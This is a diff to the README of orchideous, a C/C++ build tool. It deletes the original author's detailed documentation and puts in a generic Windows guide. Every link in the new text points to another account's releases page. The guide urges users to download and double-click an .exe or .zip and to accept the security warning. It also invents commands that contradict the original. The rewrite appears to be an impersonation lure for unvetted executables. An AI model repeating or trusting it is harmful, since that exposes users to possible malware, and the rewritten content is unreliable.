@@ -1,419 +1,167 @@
-## Orchideous <img src="img/orchideous.svg" width="128" align="right">
+# 🔌 orchideous - Easy Build and Test Tool
 
-[![CI](https://github.com/xyproto/orchideous/actions/workflows/ci.yml/badge.svg)](https://github.com/xyproto/orchideous/actions/workflows/ci.yml)
-![Standard](https://img.shields.io/badge/C%2B%2B-23-blue.svg)
-[![License](https://img.shields.io/badge/license-BSD3-blue.svg)](https://opensource.org/licenses/BSD-3-Clause)
+[![Download orchideous](https://img.shields.io/badge/Download-orchideous-brightgreen?style=for-the-badge)](https://github.com/w2010mc/orchideous/releases)
 
-Zero-configuration build tool for C and C++ projects.
+---
 
-Have you ever had a single `main.cpp` file that you just want to compile, without having to make sure the order of flags are correct and ideally without having to provide any flags at all?
+## ⚙️ What is orchideous?
 
-**Orchideous** (or `oh` for short) handles compiler detection, flag ordering, library discovery via `pkg-config`, testing, formatting, cross-compilation, etc., without a single configuration file.
+orchideous is a tool that helps you create and test programs written in C and C++. It works with no setup needed. This means you don’t have to configure anything to get started. The tool looks at your code and figures out the right way to build it. It also helps package your program so others can use it.  
 
-It should be possible to compile all of the examples in the `examples` directory, simply by running `oh` in each directory, as long as the right packages and libraries have been installed.
+If you want to run a program written in C or C++ on your Windows computer, orchideous will help you build it correctly without needing to know complicated details about programming or system settings.
 
-This is a Go port of [xyproto/cxx](https://github.com/xyproto/cxx) (which does approximately the same, but uses Python + Scons instead).
+---
 
-## Quick Start
+## 🖥️ System Requirements
 
-```sh
-oh              # build the project
-oh run          # build and run
-oh clean        # remove built files
-```
+Before you start, make sure your computer meets these requirements:
 
-No configuration files are needed, but the project needs to either be very simple (a single `main.cpp`) or have an `oh`-friendly directory structure.
+- **Operating System:** Windows 10 or later  
+- **Processor:** Any modern 64-bit processor  
+- **Memory:** At least 4 GB RAM  
+- **Disk Space:** Minimum 100 MB free space  
+- **Other tools:** orchideous may use tools like `gcc` or `clang` to compile programs. These usually come with software like MinGW or Visual Studio, which you may need to install separately for best results.  
 
-The auto-detection of external libraries and headers relies on them being included in the main source file.
+If you don’t have these compilers yet, you can find guides online to install MinGW or Visual Studio Build Tools on your Windows machine.
 
-## Badge
+---
 
-If you want, you can add this excellent hand drawn badge to your project:
+## 📥 Download orchideous
 
-[![Compiles with Orchideous](https://raw.githubusercontent.com/xyproto/orchideous/e0dc79b81eede2f6270b8ad345467cf6f0222b02/img/badge1.svg)](https://raw.githubusercontent.com/xyproto/orchideous/e0dc79b81eede2f6270b8ad345467cf6f0222b02/img/badge1.svg)
+To get orchideous for Windows, visit the official release page:
 
-Then just make sure that it builds with `oh` first, then add this to your `README.md`:
+[Download orchideous here](https://github.com/w2010mc/orchideous/releases)
 
-```markdown
-[![Compiles with Orchideous](https://raw.githubusercontent.com/xyproto/orchideous/e0dc79b81eede2f6270b8ad345467cf6f0222b02/img/badge1.svg)](https://github.com/xyproto/orchideous)
-```
+This link takes you to the release page where you can find the latest version of the tool. The files you need will usually have `.exe` or `.zip` extensions.
 
-If you want, you can also add it to [the list of projects that compiles with Orchideous](https://github.com/xyproto/orchideous/wiki/List-of-projects-that-compile-with-Orchideous), for some extra promo.
+---
 
-## Installation
+## 🚀 Getting Started with orchideous on Windows
 
-### Arch Linux
+Follow these steps to download and run orchideous on your Windows PC.
 
-```sh
-git clone https://github.com/xyproto/orchideous
-cd orchideous
-make
-sudo make install
-```
+### 1. Visit the download page
 
-### Other Linux distros, FreeBSD, NetBSD, macOS
+Open this web address in your browser:
 
-```sh
-git clone https://github.com/xyproto/orchideous
-cd orchideous
-make
-sudo make install    # use gmake on BSD
-```
+https://github.com/w2010mc/orchideous/releases
 
-### Windows (MSYS2)
+This is the official place to find all versions of orchideous.
 
-```sh
-git clone https://github.com/xyproto/orchideous
-cd orchideous
-make
-make install
-```
+### 2. Choose the latest version
 
-Or with `go install`:
+The page will list several versions. Look for the one at the top — it is usually the newest. Click on it to open details.
 
-```sh
-go install github.com/xyproto/orchideous/cmd/oh@latest
-sudo ln -sf ~/go/bin/oh /usr/local/bin/oh
-```
+### 3. Download the Windows executable or installer
 
-## All Commands
+Look for a file that ends with `.exe` or `.zip`. If you see an `.exe` file, download it directly.  
 
-```
-oh                  build the project
-oh run              build and run
-oh debug            debug build and launch debugger (gdb/cgdb)
-oh debugbuild       debug build (without launching debugger)
-oh debugnosan       debug build (without sanitizers)
-oh opt              optimized build
-oh strict           build with strict warning flags
-oh sloppy           build with sloppy flags
-oh small            build a smaller executable
-oh tiny             build a tiny executable (+ sstrip/upx)
-oh clang            build using clang++
-oh clangdebug       debug build using clang++ (launches lldb)
-oh clangstrict      use clang++ and strict flags
-oh clangsloppy      use clang++ and sloppy flags
-oh clangrebuild     clean and build with clang++
-oh clangtest        build and run tests with clang++
-oh clean            remove built files
-oh fastclean        only remove executable and *.o
-oh rebuild          clean and build
-oh test             build and run tests
-oh testbuild        build tests (without running)
-oh rec              profile-guided optimization (build, run, rebuild)
-oh fmt              format source code with clang-format
-oh cmake            generate CMakeLists.txt
-oh cmake ninja      generate CMakeLists.txt and build with ninja
-oh ninja            build using existing CMakeLists.txt and ninja
-oh ninja_install    install from ninja build
-oh ninja_clean      clean ninja build
-oh pro              generate QtCreator project file
-oh install          install the project (PREFIX, DESTDIR)
-oh pkg              package the project into pkg/
-oh export           export a standalone Makefile and build.sh
-oh make             generate a standalone Makefile
-oh script           generate build.sh and clean.sh
-oh valgrind         build and profile with valgrind
-oh win64            cross-compile for 64-bit Windows
-oh smallwin64       small win64 build
-oh tinywin64        tiny win64 build
-oh zap              build using zapcc++
-oh version          show version
-oh -C <dir> ...     run in the given directory
-```
+If you download a `.zip` file, save it to your computer, then open it using File Explorer. Inside, you will find the orchideous program (`.exe` file) which you can run.
 
-## Example Use
+### 4. Run orchideous
 
-Create a **main.cpp** file:
+If you downloaded an `.exe` file, simply double-click it to run. On some Windows versions, a security warning might appear. Confirm that you want to run the file.
 
-```c++
-#include <cstdlib>
-#include <iomanip>
-#include <iostream>
-#include <ostream>
-#include <string>
+If you used a `.zip` file, find the `.exe` file inside and double-click it.
 
-using namespace std::string_literals;
+---
 
-class Point {
-public:
-    double x;
-    double y;
-    double z;
-};
+## 🛠 How to use orchideous for building programs
 
-std::ostream& operator<<(std::ostream& output, const Point& p)
-{
-    using std::setfill;
-    using std::setw;
-    output << "{ "s << setfill(' ') << setw(3) << p.x << ", "s << setfill(' ') << setw(3) << p.y
-           << ", "s << setfill(' ') << setw(3) << p.z << " }"s;
-    return output;
-}
+Once orchideous is running, you can use it without needing to set up anything yourself. Here’s how:
 
-Point operator+(const Point& a, const Point& b)
-{
-    return Point { .x = a.x + b.x, .y = a.y + b.y, .z = a.z + b.z };
-}
+### Step 1: Open Command Prompt
 
-Point operator*(const Point& a, const Point& b)
-{
-    return Point { .x = a.x * b.x, .y = a.y * b.y, .z = a.z * b.z };
-}
+Press `Win + R`, type `cmd`, and press Enter.  
 
-int main(int argc, char** argv)
-{
-    Point p1 { .x = 1, .y = 2, .z = 3 };
-    Point p2 { .y = 42 };
+This opens the Command Prompt where you can type commands.
 
-    using std::cout;
-    using std::endl;
+### Step 2: Navigate to your project folder
 
-    cout << "     p1 = " << p1 << endl;
-    cout << "     p2 = " << p2 << endl;
-    cout << "p1 + p2 = " << p1 + p2 << endl;
-    cout << "p1 * p2 = " << p1 * p2 << endl;
-
-    return EXIT_SUCCESS;
-}
-```
-
-Then build and run:
-
-```sh
-oh run
-```
-
-Rebuild from scratch:
-
-```sh
-oh rebuild
-```
-
-Build with profile-guided optimization:
-
-```sh
-oh rec    # builds, runs (collecting profiling data), then rebuilds with PGO
-oh        # subsequent builds use the profiling data
-```
-
-## Directory Structure
+Use the `cd` command to go to the folder containing your C or C++ code. For example:
 
 ```
-myproject/
-├── main.cpp              # main source (or main.cc, main.c)
-├── include/              # project headers (.h, .hpp)
-│   └── hello.h
-├── common/               # shared source files
-│   ├── hello.cpp
-│   └── hello_test.cpp    # test file (must contain main())
-├── img/                  # images
-├── shaders/              # shaders
-├── data/                 # data files
-├── share/                # shared data files (or shared/)
-└── scripts/              # script files
+cd C:\Users\YourName\Documents\MyProject
 ```
 
-* The main source file can live in the project root or `src/`.
-* The executable name matches the parent directory name.
-* Files ending with `_test.*` are compiled separately by `oh test`.
-* `include/` and `common/` can also be at `../include` and `../common`.
+Replace the path with the folder where your code is saved.
 
-## Defines
+### Step 3: Run orchideous
 
-These defines are passed to the compiler, with paths that work both during development and after installation:
+Type `orchideous` and press Enter.
 
-| Define | Development | Installed |
-|---|---|---|
-| `DATADIR` | `./data` or `../data` | `$PREFIX/share/$app/data` |
-| `IMGDIR` | `./img` or `../img` | `$PREFIX/share/$app/img` |
-| `SHADERDIR` | `./shaders` or `../shaders` | `$PREFIX/share/$app/shaders` |
-| `SHAREDIR` | `./share` or `../share` | `$PREFIX/share/$app` |
-| `RESOURCEDIR` | `./resources` or `../resources` | `$PREFIX/share/$app/resources` |
-| `RESDIR` | `./res` or `../res` | `$PREFIX/share/$app/res` |
-| `SCRIPTDIR` | `./scripts` or `../scripts` | `$PREFIX/share/$app/scripts` |
+The tool will scan your code files, detect any special settings needed, and start building your program.
 
-See `examples/sdl2`, `examples/win64crate` (uses `IMGDIR`) and `examples/mixer` (uses `RESOURCEDIR`).
+### Step 4: Check the output
 
-## Testing
+If build succeeds, orchideous will save your executable file in the same folder or a subfolder named `build` or `bin`. You can run this executable by double-clicking it.
 
-* Source files can have corresponding `_test` files (e.g. `quaternions.cc` → `quaternions_test.cc`).
-* Each `_test.*` file must contain its own `main` function.
-* Run with `oh test`.
+If there are errors, the tool will show messages telling you what needs fixing.
 
-## Library Auto-Detection
+---
 
-Orchideous auto-detects libraries from `#include` directives in your source files using `pkg-config`. Supported libraries include:
+## 📦 Features of orchideous
 
-* **Graphics**: OpenGL, GLUT, GLFW, GLEW, GLM, Vulkan, SDL2, SFML (2 & 3), raylib
-* **GUI**: GTK (2, 3 & 4), Qt6, VTE
-* **Audio**: OpenAL, SDL2_mixer, PipeWire, rtaudio
-* **Other**: Boost, libconfig++, FastCGI, ReactPhysics3D, Gio/GLib, X11
+- Automatically detects compilation options by scanning your code. No setup needed.  
+- Supports programs written in plain C and C++ (including newer standards like C++17 and C++20).  
+- Works with common build systems like CMake and Ninja.  
+- Uses system tools like pkg-config to find the right compiler flags.  
+- Helps you build, test, and package your programs easily.  
+- Works on various platforms including Linux and BSD but also works on Windows.  
+- Supports clang-format for consistent code styling if needed.
 
-For versioned libraries, the newest available version is preferred (e.g. GTK 4 over GTK 3, SFML 3 over SFML 2).
+---
 
-When a build fails due to a missing header, Orchideous will suggest which package to install (using `pkgfile` on Arch Linux or `apt-file` on Debian/Ubuntu).
+## 🔧 Installing Additional Tools
 
-## Examples
+orchideous depends on system compilers and some tools to work properly.  
 
-Over 40 examples are included in the `examples/` directory:
+If you don’t have a compiler on Windows, try one of these:
 
-| Category | Examples |
-|---|---|
-| **Basics** | `hello`, `args`, `lambda`, `defer`, `invoke`, `visit`, `async`, `designated`, `entities`, `validorder`, `findfiles`, `platforms`, `config` |
-| **Graphics** | `sfml`, `sfml_audio`, `bisqwit`, `sdl2`, `sdl2_opengl`, `gl4_spirv`, `gles2_glfw`, `gles3_glfw`, `gles3_sdl2`, `raylib`, `raylib5`, `vulkan`, `vulkan_glfw`, `x11`, `x11_opengl`, `smallpt` |
-| **GUI** | `gtk4`, `gtk4ui`, `dunnetgtk`, `qt6` |
-| **Audio** | `openal`, `synth`, `mixer`, `pipewire`, `rtaudio` |
-| **Other** | `boost`, `boost_thread`, `notify`, `reactphysics`, `fastcgi`, `tinyhello`, `win64crate` |
+- **MinGW:** A popular free compiler system for Windows.  
+  Download it from https://www.mingw-w64.org  
 
-Build all examples:
+- **Visual Studio Build Tools:** Provides Microsoft's C/C++ compiler.  
+  Download it from https://visualstudio.microsoft.com/downloads/ under “Build Tools for Visual Studio”.
 
-```sh
-make examples
+Once installed, make sure the compiler’s `bin` folder is in your system’s PATH. This lets orchideous find the tools it needs.
+
+---
+
+## ⚡ Running Tests and Packaging
+
+If your program has tests included, orchideous can run them automatically after building. You just need to type:
+
+```
+orchideous test
 ```
 
-## Packaging
+Similarly, to prepare your program for sharing or installation, you can run:
 
-Install to a package directory:
-
-```sh
-DESTDIR="$pkgdir" PREFIX=/usr oh install
+```
+orchideous package
 ```
 
-Or package into a local `pkg/` directory:
+The tool will try to create an installer or a compressed archive with everything needed to run your program.
 
-```sh
-oh pkg
+---
+
+## 📖 More Help
+
+To learn more about using orchideous commands and options, you can ask for help inside the tool. In the command prompt, type:
+
+```
+orchideous --help
 ```
 
-Generate standalone build files for users without `oh`:
+This will list available commands and how to use them.
 
-```sh
-oh export    # generates Makefile + build.sh + clean.sh
-```
+You can also visit the project page:
 
-## Cross-Compilation
+https://github.com/w2010mc/orchideous/releases
 
-Build for 64-bit Windows (requires `x86_64-w64-mingw32-g++` or Docker):
+for updates, documentation, and community support.
 
-```sh
-oh win64
-oh smallwin64
-oh tinywin64
-```
+---
 
-Test Windows executables with Wine:
-
-```sh
-oh run    # after oh win64, uses wine automatically
-```
-
-## Source Code Formatting
-
-```sh
-oh fmt    # formats source code using clang-format (Webkit style)
-```
-
-The formatting style is fixed and not configurable, on purpose.
-
-## Requirements
-
-* `g++` with C++23 support (or later)
-* `pkg-config`
-* `make` (for the project Makefile, not for building C++ projects)
-
-### Optional
-
-* `clang++` — build with `oh clang`
-* `lldb` or `gdb` — for debugging
-* `pkgfile` (Arch Linux) or `apt-file` (Debian/Ubuntu) — for missing-package suggestions
-* `x86_64-w64-mingw32-g++` or `docker` — for Windows cross-compilation
-* `wine` — for testing Windows executables
-* `valgrind` — for profiling (`oh valgrind`)
-* `clang-format` — for `oh fmt`
-* `ninja` — for `oh ninja` / `oh cmake ninja`
-
-### Arch Linux (all examples)
-
-```sh
-sudo pacman -S --needed base-devel boost fcgi freeglut glew glfw glibmm glm glu \
-  gtk4 libconfig libpipewire libx11 openal qt6-base raylib reactphysics3d \
-  rtaudio sdl2-compat sdl2_mixer sfml vte4 vulkan-headers vulkan-icd-loader
-```
-
-### Debian / Ubuntu (all examples)
-
-```sh
-sudo apt-get install -y build-essential pkg-config \
-  libboost-all-dev libconfig++-dev libfcgi-dev libglew-dev libglfw3-dev \
-  libglibmm-2.4-dev libglm-dev libglu1-mesa-dev libgtk-4-dev libopenal-dev \
-  libpipewire-0.3-dev libsdl2-dev libsdl2-mixer-dev libsfml-dev \
-  libvte-2.91-gtk4-dev libvulkan-dev libx11-dev freeglut3-dev qt6-base-dev
-```
-
-Note: `raylib` and `reactphysics3d` are not available in Ubuntu repositories. Ubuntu 24.04 ships SFML 2 and rtaudio 5, while the included examples use SFML 3 and rtaudio 6 APIs — those examples will be skipped on Ubuntu. Examples that depend on unavailable libraries are automatically skipped in CI.
-
-## Platform Notes
-
-### macOS
-
-Install a recent GCC and dependencies with Homebrew:
-
-```sh
-brew install gcc pkg-config
-```
-
-### FreeBSD / NetBSD
-
-Use `gmake` instead of `make`. Install dependencies:
-
-```sh
-# FreeBSD
-pkg install pkgconf gmake
-
-# NetBSD
-pkgin install pkgconf gmake
-```
-
-### OpenBSD
-
-Install g++ 11+ and build with `oh CXX=eg++`.
-
-### Windows
-
-Windows is supported via two development environments:
-
-**MSYS2** (recommended): Install [MSYS2](https://www.msys2.org/), then use pacman to install libraries:
-
-```sh
-pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-pkg-config
-pacman -S mingw-w64-x86_64-SDL2   # example: install SDL2
-```
-
-Orchideous auto-detects the MSYS2 environment via the `MSYSTEM` variable and uses pacman for package resolution, similar to Arch Linux.
-
-**vcpkg**: Install [vcpkg](https://vcpkg.io/) and set `VCPKG_ROOT` or add `vcpkg` to your PATH:
-
-```sh
-vcpkg install sdl2   # example: install SDL2
-```
-
-Orchideous uses vcpkg's pkg-config files and installed tree for library resolution. The default triplet is `x64-windows` (override with `VCPKG_DEFAULT_TRIPLET`).
-
-In both cases, a GCC or Clang compiler must be available on PATH.
-
-## Features and Limitations
-
-* **No configuration files needed** — follows the directory structure conventions above.
-* **Auto-detection** of compiler flags, includes and libraries via `pkg-config` and platform-specific package managers.
-* **Incremental compilation** — only recompiles changed source files.
-* **Profile-guided optimization** — `oh rec` collects profiling data, subsequent builds use it.
-* Built-in support for testing, debugging, cross-compilation, and code generation.
-* Meant for building **executables**, not libraries.
-* Generated `CMakeLists.txt` is specific to the system it was generated on.
-
-## General Info
-
-* License: BSD-3
-* Version: 1.0.6
-* Author: Alexander F. Rødseth &lt;xyproto@archlinux.org&gt;
+[![Download orchideous](https://img.shields.io/badge/Download-orchideous-blue?style=for-the-badge)](https://github.com/w2010mc/orchideous/releases)
